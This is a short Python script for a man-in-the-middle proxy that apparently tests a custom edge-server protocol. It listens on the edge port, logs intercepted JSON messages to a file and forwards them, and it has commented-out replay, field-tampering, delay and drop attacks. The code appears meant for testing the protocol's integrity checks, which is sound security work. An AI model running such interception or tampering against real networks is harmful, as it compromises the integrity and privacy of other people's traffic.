import socket
import json
import time

# === CONFIG ===
FAKE_EDGE_PORT = 8082        # same as EDGE_PORT (we hijack it)
REAL_EDGE_IP = "127.0.0.1"   # change to actual edge IP
REAL_EDGE_PORT = 8084        # move real edge to another port

LOG_FILE = "mitm_logs.txt"


class MITMEdge:
    def __init__(self):
        pass

    def start(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
            server.bind(("0.0.0.0", FAKE_EDGE_PORT))
            server.listen(5)

            print("[MITM] Fake Edge Server listening...")

            while True:
                conn, addr = server.accept()
                print(f"[MITM] Intercepted connection from {addr}")
                self.handle_client(conn)

    def handle_client(self, conn):
        with conn:
            buffer = ""
            while True:
                chunk = conn.recv(4096).decode()
                if not chunk:
                    break
                buffer += chunk
                if "\n" in buffer:
                    break

            try:
                data = json.loads(buffer.strip())
            except:
                print("[MITM] Invalid JSON")
                return

            # === LOG ORIGINAL DATA ===
            self.log_data(data)

            # === ATTACK OPTIONS ===
            # Uncomment any attack you want

            # 1. Replay attack
            # self.replay_attack(data)

            # 2. Tampering attack (will fail integrity)
            # data["hM"] = "000000000000"

            # 3. Delay attack
            # time.sleep(5)

            # 4. Drop attack
            # return

            # === FORWARD TO REAL EDGE ===
            self.forward_to_real_edge(data)

    def forward_to_real_edge(self, data):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((REAL_EDGE_IP, REAL_EDGE_PORT))
                s.sendall((json.dumps(data) + "\n").encode())

            print("[MITM] Forwarded to real Edge")

        except Exception as e:
            print("[MITM] Forward failed:", e)

    def replay_attack(self, data):
        print("[MITM] Replaying message...")

        for _ in range(3):
            self.forward_to_real_edge(data)
            time.sleep(1)

    def log_data(self, data):
        with open(LOG_FILE, "a") as f:
            f.write(json.dumps(data, indent=2))
            f.write("\n\n")

        print("[MITM] Logged intercepted payload")


if __name__ == "__main__":
    mitm = MITMEdge()
    mitm.start()



   # https://chatgpt.com/share/69c0dd07-14b0-8008-a8a9-a221d49b9814 